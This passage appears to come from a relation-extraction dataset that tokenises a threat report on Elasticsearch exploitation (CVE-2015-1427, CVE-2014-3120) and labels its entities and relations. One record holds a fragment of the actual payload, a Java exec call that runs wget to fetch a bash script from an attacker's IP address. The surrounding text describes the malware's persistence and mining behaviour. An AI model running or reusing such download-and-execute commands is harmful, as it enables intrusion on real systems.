"these", "actors", "consistently", "deploys", "two", "distinct", "payloads", "with", "the", "initial", "exploit", ",", "always", "using", "CVE-2015-1427", "."], ["The", "first", "payload", "invokes", "wget", "to", "download", "a", "bash", "script", ",", "while", "the", "second", "payload", "uses", "obfuscated", "Java", "to", "invoke", "bash", "and", "download", "the", "same", "bash", "script", "with", "wget", "."], ["The", "bash", "script", "utilized", "by", "the", "attacker", "follows", "a", "commonly", "observed", "pattern", "of", "disabling", "security", "protections", "and", "killing", "a", "variety", "of", "other", "malicious", "processes", "(", "primarily", "other", "mining", "malware", ")", ",", "before", "placing", "its", "RSA", "key", "in", "the", "authorized_keys", "file", "."], ["Additionally", ",", "this", "bash", "script", "serves", "to", "download", "illicit", "miners", "and", "their", "configuration", "files", "."], ["The", "script", "achieves", "persistence", "by", "installing", "shell", "scripts", "as", "cron", "jobs", "."], ["This", "bash", "script", "also", "downloads", "a", "UPX-packed", "ELF", "executable", "."], ["Analysis", "of", "the", "unpacked", "sample", "reveals", "that", "this", "executable", "contains", "exploits", "for", "a", "variety", "of", "other", "systems", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "attackers", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [20, 20], "name": "http : //45.76.122.92:8506/IOFoqIgyC0zmf2UR/uuu.sh", "pos": [11, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "actors", "pos": [30, 31], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "payloads", "pos": [35, 36], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [52, 52], "name": "CVE-2015-1427", "pos": [43, 44], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "first payload", "pos": [1, 3], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [58, 58], "name": "wget", "pos": [4, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [62, 62], "name": "bash script", "pos": [8, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [67, 67], "name": "second payload", "pos": [13, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "bash script", "pos": [25, 27], "index": "9_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [82, 82], "name": "wget", "pos": [28, 29], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [85, 85], "name": "bash", "pos": [1, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "attacker", "pos": [6, 7], "index": "12_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [98, 98], "name": "security protections", "pos": [14, 16], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [106, 106], "name": "malicious processes", "pos": [22, 24], "index": "14_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [122, 122], "name": "authorized_keys file", "pos": [38, 40], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [128, 128], "name": "bash", "pos": [3, 4], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [133, 133], "name": "illicit miners", "pos": [8, 10], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "configuration files", "pos": [12, 14], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [146, 146], "name": "shell scripts", "pos": [6, 8], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [149, 149], "name": "cron jobs", "pos": [9, 11], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [153, 153], "name": "bash", "pos": [1, 2], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [159, 159], "name": "ELF executable", "pos": [7, 9], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [170, 170], "name": "executable", "pos": [8, 9], "index": "23_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 12}, {"r": "ST", "evidence": [1], "t": 1, "h": 2}, {"r": "RF", "evidence": [1], "t": 1, "h": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "h": 2, "t": 4}, {"r": "FR", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "FR", "evidence": [1, 2], "h": 2, "t": 8}, {"r": "EX", "evidence": [1, 2], "t": 3, "h": 5}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 5, "t": 7}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "FR", "evidence": [2], "h": 8, "t": 10}, {"r": "FR", "evidence": [3], "t": 11, "h": 12}, {"r": "RD", "evidence": [3], "h": 11, "t": 13}, {"r": "EX", "evidence": [2, 3], "t": 9, "h": 11}, {"r": "WR", "evidence": [3], "h": 11, "t": 13}, {"r": "RD", "evidence": [3], "h": 11, "t": 13}, {"r": "UK", "evidence": [3], "h": 11, "t": 14}, {"r": "RD", "evidence": [3], "h": 11, "t": 15}, {"r": "RD", "evidence": [3], "h": 11, "t": 15}, {"r": "RD", "evidence": [3], "h": 11, "t": 15}, {"r": "RD", "evidence": [3], "h": 11, "t": 15}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 16}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 11, "t": 21}, {"r": "WR", "evidence": [4], "h": 16, "t": 17}, {"r": "WR", "evidence": [4], "h": 16, "t": 18}, {"r": "WR", "evidence": [4, 5], "h": 16, "t": 19}, {"r": "CO", "evidence": [5], "h": 19, "t": 20}, {"r": "WR", "evidence": [6], "h": 21, "t": 22}, {"r": "CO", "evidence": [6, 7], "t": 22, "h": 23}]}, {"title": "655-1", "sents": [["Runtime\\", "''", ")", ".getRuntime", "(", ")", ".exec", "(", "\\", "''", "wget", "http", ":", "//45.76.122.92:8506/IOFoqIgyC0zmf2UR/uuu.sh", "-P", "/tmp/sssooo\\", "''", ")", ".getText", "(", ")", "''", "}", "}", "}", "The", "most", "active", "of", "these", "actors", "consistently", "deploys", "two", "distinct", "payloads", "with", "the", "initial", "exploit", ",", "always", "using", "CVE-2015-1427", "."], ["The", "first", "payload", "invokes", "wget", "to", "download", "a", "bash", "script", ",", "while", "the", "second", "payload", "uses", "obfuscated", "Java", "to", "invoke", "bash", "and", "download", "the", "same", "bash", "script", "with", "wget", "."], ["The", "bash", "script", "utilized", "by", "the", "attacker", "follows", "a", "commonly", "observed", "pattern", "of", "disabling", "security", "protections", "and", "killing", "a", "variety", "of", "other", "malicious", "processes", "(", "primarily", "other", "mining", "malware", ")", ",", "before", "placing", "its", "RSA", "key", "in", "the", "authorized_keys", "file", "."], ["Additionally", ",", "this", "bash", "script", "serves", "to", "download", "illicit", "miners", "and", "their", "configuration", "files", "."], ["The", "script", "achieves", "persistence", "by", "installing", "shell", "scripts", "as", "cron", "jobs", "."], ["This", "bash", "script", "also", "downloads", "a", "UPX-packed", "ELF", "executable", "."], ["Analysis", "of", "the", "unpacked", "sample", "reveals", "that", "this", "executable", "contains", "exploits", "for", "a", "variety", "of", "other", "systems", "."], ["The", "exploits", "are", "sent", ",", "typically", "via", "HTTPS", ",", "to", "the", "targeted", "systems", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [11, 11], "name": "http : //45.76.122.92:8506/IOFoqIgyC0zmf2UR/uuu.sh", "pos": [11, 14], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [30, 30], "name": "actors", "pos": [30, 31], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [35, 35], "name": "payloads", "pos": [35, 36], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [43, 43], "name": "CVE-2015-1427", "pos": [43, 44], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [46, 46], "name": "first payload", "pos": [1, 3], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [49, 49], "name": "wget", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "bash script", "pos": [8, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [58, 58], "name": "second payload", "pos": [13, 15], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [70, 70], "name": "bash script", "pos": [25, 27], "index": "8_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [73, 73], "name": "wget", "pos": [28, 29], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "bash", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [81, 81], "name": "attacker", "pos": [6, 7], "index": "11_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [89, 89], "name": "security protections", "pos": [14, 16], "index": "12_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [97, 97], "name": "malicious processes", "pos": [22, 24], "index": "13_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [113, 113], "name": "authorized_keys file", "pos": [38, 40], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [119, 119], "name": "bash", "pos": [3, 4], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [124, 124], "name": "illicit miners", "pos": [8, 10], "index": "16_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [128, 128], "name": "configuration files", "pos": [12, 14], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "shell scripts", "pos": [6, 8], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [140, 140], "name": "cron jobs", "pos": [9, 11], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [144, 144], "name": "bash", "pos": [1, 2], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [150, 150], "name": "ELF executable", "pos": [7, 9], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [161, 161], "name": "executable", "pos": [8, 9], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [172, 172], "name": "exploits", "pos": [1, 2], "index": "23_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [178, 178], "name": "HTTPS", "pos": [7, 8], "index": "24_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [0], "h": 1, "t": 3}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 7}, {"r": "EX", "evidence": [0, 1], "t": 2, "h": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "WR", "evidence": [1], "h": 7, "t": 8}, {"r": "FR", "evidence": [1], "h": 7, "t": 9}, {"r": "FR", "evidence": [2], "t": 10, "h": 11}, {"r": "RD", "evidence": [2], "h": 10, "t": 12}, {"r": "EX", "evidence": [1, 2], "t": 8, "h": 10}, {"r": "WR", "evidence": [2], "h": 10, "t": 12}, {"r": "RD", "evidence": [2], "h": 10, "t": 12}, {"r": "UK", "evidence": [2], "h": 10, "t": 13}, {"r": "RD", "evidence": [2], "h": 10, "t": 14}, {"r": "RD", "evidence": [2], "h": 10, "t": 14}, {"r": "RD", "evidence": [2], "h": 10, "t": 14}, {"r": "RD", "evidence": [2], "h": 10, "t": 14}, {"r": "CO", "evidence": [2, 3], "h": 10, "t": 15}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 10, "t": 20}, {"r": "WR", "evidence": [3], "h": 15, "t": 16}, {"r": "WR", "evidence": [3], "h": 15, "t": 17}, {"r": "WR", "evidence": [3, 4], "h": 15, "t": 18}, {"r": "CO", "evidence": [4], "h": 18, "t": 19}, {"r": "WR", "evidence": [5], "h": 20, "t": 21}, {"r": "CO", "evidence": [5, 6], "t": 21, "h": 22}, {"r": "WR", "evidence": [6, 7], "t": 22, "h": 23}, {"r": "ST", "evidence": [7], "h": 23, "t": 24}]}, {"title": "655-2", "sents": [["The", "first", "payload", "invokes", "wget", "to", "download", "a", "bash", "script", ",", "while", "the", "second", "payload", "uses", "obfuscated", "Java", "to", "invoke", "bash", "and", "download", "the", "same", "bash", "script", "with", "wget", "."], ["The", "bash", "script", "utilized", "by", "the", "attacker", "follows", "a", "commonly", "observed", "pattern", "of", "disabling", "security", "protections", "and", "killing", "a", "variety", "of", "other", "malicious", "processes", "(", "primarily", "other", "mining", "malware", ")", ",", "before", "placing", "its", "RSA", "key", "in", "the", "authorized_keys", "file", "."], ["Additionally", ",", "this", "bash", "script", "serves", "to", "download", "illicit", "miners", "and", "their", "configuration", "files", "."], ["The", "script", "achieves", "persistence", "by", "installing", "shell", "scripts", "as", "cron", "jobs", "."], ["This", "bash", "script", "also", "downloads", "a", "UPX-packed", "ELF", "executable", "."], ["Analysis", "of", "the", "unpacked", "sample", "reveals", "that", "this", "executable", "contains", "exploits", "for", "a", "variety", "of", "other", "systems", "."], ["The", "exploits", "are", "sent", ",", "typically", "via", "HTTPS", ",", "to", "the", "targeted", "systems", "."], ["As", "evidenced", "by", "each", "of", "these", "exploits", ",", "the", "attacker", "'s", "goal", "appears", "to", "be", "obtaining", "remote", "code", "execution", "on", "targeted", "machines", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "first payload", "pos": [1, 3], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [4, 4], "name": "wget", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "bash script", "pos": [8, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "second payload", "pos": [13, 15], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [25, 25], "name": "bash script", "pos": [25, 27], "index": "4_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [28, 28], "name": "wget", "pos": [28, 29], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "bash", "pos": [1, 2], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "attacker", "pos": [6, 7], "index": "7_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [44, 44], "name": "security protections", "pos": [14, 16], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [52, 52], "name": "malicious processes", "pos": [22, 24], "index": "9_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [68, 68], "name": "authorized_keys file", "pos": [38, 40], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [74, 74], "name": "bash", "pos": [3, 4], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "illicit miners", "pos": [8, 10], "index": "12_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [83, 83], "name": "configuration files", "pos": [12, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [92, 92], "name": "shell scripts", "pos": [6, 8], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [95, 95], "name": "cron jobs", "pos": [9, 11], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [99, 99], "name": "bash", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [105, 105], "name": "ELF executable", "pos": [7, 9], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [116, 116], "name": "executable", "pos": [8, 9], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [127, 127], "name": "exploits", "pos": [1, 2], "index": "19_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [133, 133], "name": "HTTPS", "pos": [7, 8], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [149, 149], "name": "attacker", "pos": [9, 10], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [156, 156], "name": "remote code", "pos": [16, 18], "index": "22_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 3, "t": 4}, {"r": "FR", "evidence": [0], "h": 3, "t": 5}, {"r": "FR", "evidence": [1], "t": 6, "h": 7}, {"r": "RD", "evidence": [1], "h": 6, "t": 8}, {"r": "EX", "evidence": [0, 1], "t": 4, "h": 6}, {"r": "WR", "evidence": [1], "h": 6, "t": 8}, {"r": "RD", "evidence": [1], "h": 6, "t": 8}, {"r": "UK", "evidence": [1], "h": 6, "t": 9}, {"r": "RD", "evidence": [1], "h": 6, "t": 10}, {"r": "RD", "evidence": [1], "h": 6, "t": 10}, {"r": "RD", "evidence": [1], "h": 6, "t": 10}, {"r": "RD", "evidence": [1], "h": 6, "t": 10}, {"r": "CO", "evidence": [1, 2], "h": 6, "t": 11}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 6, "t": 16}, {"r": "WR", "evidence": [2], "h": 11, "t": 12}, {"r": "WR", "evidence": [2], "h": 11, "t": 13}, {"r": "WR", "evidence": [2, 3], "h": 11, "t": 14}, {"r": "CO", "evidence": [3], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 16, "t": 17}, {"r": "CO", "evidence": [4, 5], "t": 17, "h": 18}, {"r": "WR", "evidence": [5, 6], "t": 18, "h": 19}, {"r": "ST", "evidence": [6], "h": 19, "t": 20}, {"r": "WR", "evidence": [5, 6, 7], "t": 18, "h": 21}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}]}, {"title": "655-3", "sents": [["The", "bash", "script", "utilized", "by", "the", "attacker", "follows", "a", "commonly", "observed", "pattern", "of", "disabling", "security", "protections", "and", "killing", "a", "variety", "of", "other", "malicious", "processes", "(", "primarily", "other", "mining", "malware", ")", ",", "before", "placing", "its", "RSA", "key", "in", "the", "authorized_keys", "file", "."], ["Additionally", ",", "this", "bash", "script", "serves", "to", "download", "illicit", "miners", "and", "their", "configuration", "files", "."], ["The", "script", "achieves", "persistence", "by", "installing", "shell", "scripts", "as", "cron", "jobs", "."], ["This", "bash", "script", "also", "downloads", "a", "UPX-packed", "ELF", "executable", "."], ["Analysis", "of", "the", "unpacked", "sample", "reveals", "that", "this", "executable", "contains", "exploits", "for", "a", "variety", "of", "other", "systems", "."], ["The", "exploits", "are", "sent", ",", "typically", "via", "HTTPS", ",", "to", "the", "targeted", "systems", "."], ["As", "evidenced", "by", "each", "of", "these", "exploits", ",", "the", "attacker", "'s", "goal", "appears", "to", "be", "obtaining", "remote", "code", "execution", "on", "targeted", "machines", "."], ["Talos", "observed", "a", "second", "actor", "exploiting", "CVE-2014-3120", ",", "using", "it", "to", "deliver", "a", "payload", "that", "is", "derivative", "of", "the", "Bill", "Gates", "distributed", "denial-of-service", "malware", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "bash", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "attacker", "pos": [6, 7], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [14, 14], "name": "security protections", "pos": [14, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [22, 22], "name": "malicious processes", "pos": [22, 24], "index": "3_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [38, 38], "name": "authorized_keys file", "pos": [38, 40], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "bash", "pos": [3, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [49, 49], "name": "illicit miners", "pos": [8, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "configuration files", "pos": [12, 14], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [62, 62], "name": "shell scripts", "pos": [6, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [65, 65], "name": "cron jobs", "pos": [9, 11], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "bash", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [75, 75], "name": "ELF executable", "pos": [7, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [86, 86], "name": "executable", "pos": [8, 9], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [97, 97], "name": "exploits", "pos": [1, 2], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [103, 103], "name": "HTTPS", "pos": [7, 8], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [119, 119], "name": "attacker", "pos": [9, 10], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [126, 126], "name": "remote code", "pos": [16, 18], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [136, 136], "name": "second actor", "pos": [3, 5], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [139, 139], "name": "CVE-2014-3120", "pos": [6, 7], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [146, 146], "name": "payload", "pos": [13, 14], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [152, 152], "name": "Bill Gates", "pos": [19, 21], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "UK", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0], "h": 0, "t": 4}, {"r": "RD", "evidence": [0], "h": 0, "t": 4}, {"r": "RD", "evidence": [0], "h": 0, "t": 4}, {"r": "RD", "evidence": [0], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 10}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 5, "t": 7}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "CO", "evidence": [3, 4], "t": 11, "h": 12}, {"r": "WR", "evidence": [4, 5], "t": 12, "h": 13}, {"r": "ST", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [4, 5, 6], "t": 12, "h": 15}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "WR", "evidence": [6, 7], "t": 16, "h": 17}, {"r": "EX", "evidence": [7], "h": 17, "t": 18}, {"r": "WR", "evidence": [7], "h": 17, "t": 19}, {"r": "CO", "evidence": [7], "h": 19, "t": 20}]}, {"title": "655-4", "sents": [["Additionally", ",", "this", "bash", "script", "serves", "to", "download", "illicit", "miners", "and", "their", "configuration", "files", "."], ["The", "script", "achieves", "persistence", "by", "installing", "shell", "scripts", "as", "cron", "jobs", "."], ["This", "bash", "script", "also", "downloads", "a", "UPX-packed", "ELF", "executable", "."], ["Analysis", "of", "the", "unpacked", "sample", "reveals", "that", "this", "executable", "contains", "exploits", "for", "a", "variety", "of", "other", "systems", "."], ["The", "exploits", "are", "sent", ",", "typically", "via", "HTTPS", ",", "to", "the", "targeted", "systems", "."], ["As", "evidenced", "by", "each", "of", "these", "exploits", ",", "the", "attacker", "'s", "goal", "appears", "to", "be", "obtaining", "remote", "code", "execution", "on", "targeted", "machines", "."], ["Talos", "observed", "a", "second", "actor", "exploiting", "CVE-2014-3120", ",", "using", "it", "to", "deliver", "a", "payload", "that", "is", "derivative", "of", "the", "Bill", "Gates", "distributed", "denial-of-service", "malware", "."], ["A", "third", "actor", "attempts", "to", "download", "a", "file", "named", "``", "LinuxT", "''", "from", "an", "HTTP", "file", "server", "using", "exploits", "targeting", "CVE-2014-3120", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "bash", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "illicit miners", "pos": [8, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "configuration files", "pos": [12, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "shell scripts", "pos": [6, 8], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "cron jobs", "pos": [9, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [28, 28], "name": "bash", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [34, 34], "name": "ELF executable", "pos": [7, 9], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [45, 45], "name": "executable", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [56, 56], "name": "exploits", "pos": [1, 2], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [62, 62], "name": "HTTPS", "pos": [7, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [78, 78], "name": "attacker", "pos": [9, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [85, 85], "name": "remote code", "pos": [16, 18], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [95, 95], "name": "second actor", "pos": [3, 5], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [98, 98], "name": "CVE-2014-3120", "pos": [6, 7], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [105, 105], "name": "payload", "pos": [13, 14], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [111, 111], "name": "Bill Gates", "pos": [19, 21], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [118, 118], "name": "third actor", "pos": [1, 3], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [127, 127], "name": "LinuxT", "pos": [10, 11], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [131, 131], "name": "HTTP", "pos": [14, 15], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [137, 137], "name": "CVE-2014-3120", "pos": [20, 21], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "CO", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "WR", "evidence": [3, 4], "t": 7, "h": 8}, {"r": "ST", "evidence": [4], "h": 8, "t": 9}, {"r": "WR", "evidence": [3, 4, 5], "t": 7, "h": 10}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "EX", "evidence": [6], "h": 12, "t": 13}, {"r": "WR", "evidence": [6], "h": 12, "t": 14}, {"r": "CO", "evidence": [6], "h": 14, "t": 15}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}, {"r": "ST", "evidence": [7], "h": 16, "t": 18}, {"r": "RF", "evidence": [7], "h": 16, "t": 18}, {"r": "EX", "evidence": [7], "h": 16, "t": 19}]}, {"title": "655-5", "sents": [["The", "script", "achieves", "persistence", "by", "installing", "shell", "scripts", "as", "cron", "jobs", "."], ["This", "bash", "script", "also", "downloads", "a", "UPX-packed", "ELF", "executable", "."], ["Analysis", "of", "the", "unpacked", "sample", "reveals", "that", "this", "executable", "contains", "exploits", "for", "a", "variety", "of", "other", "systems", "."], ["The", "exploits", "are", "sent", ",", "typically", "via", "HTTPS", ",", "to", "the", "targeted", "systems", "."], ["As", "evidenced", "by", "each", "of", "these", "exploits", ",", "the", "attacker", "'s", "goal", "appears", "to", "be", "obtaining", "remote", "code", "execution", "on", "targeted", "machines", "."], ["Talos", "observed", "a", "second", "actor", "exploiting", "CVE-2014-3120", ",", "using", "it", "to", "deliver", "a", "payload", "that", "is", "derivative", "of", "the", "Bill", "Gates", "distributed", "denial-of-service", "malware", "."], ["A", "third", "actor", "attempts", "to", "download", "a", "file", "named", "``", "LinuxT", "''", "from", "an", "HTTP", "file", "server", "using", "exploits", "targeting", "CVE-2014-3120", "."], ["The", "LinuxT", "file", "is", "no", "longer", "hosted", "on", "the", "command", "and", "control", "(", "C2", ")", "server", "despite", "continued", "exploits", "requesting", "the", "file", ",", "although", "several", "other", "malicious", "files", "are", "still", "being", "hosted", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "shell scripts", "pos": [6, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "cron jobs", "pos": [9, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [13, 13], "name": "bash", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "ELF executable", "pos": [7, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 